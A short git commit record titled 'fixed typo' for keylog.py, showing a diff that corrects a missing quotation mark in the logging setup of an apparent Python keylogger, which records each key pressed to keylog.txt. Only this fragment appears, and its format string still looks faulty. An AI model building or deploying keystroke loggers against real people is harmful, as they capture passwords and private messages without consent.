d43ff3d9dd165eda5f702d90317fb5b9ba7309f0
Stephen Harris <trackmastersteve@users.noreply.github.com>
2018-10-09 18:03:49 -0700

    fixed typo

--- keylog.py
+++ keylog.py
@@ -4,7 +4,7 @@ import logging
 
 log_dir = ""
 
-logging.basicConfig(filename=(log_dir) + "keylog.txt), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
+logging.basicConfig(filename=(log_dir) + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
 
 def on_press(key):
     logging.info(str(key))
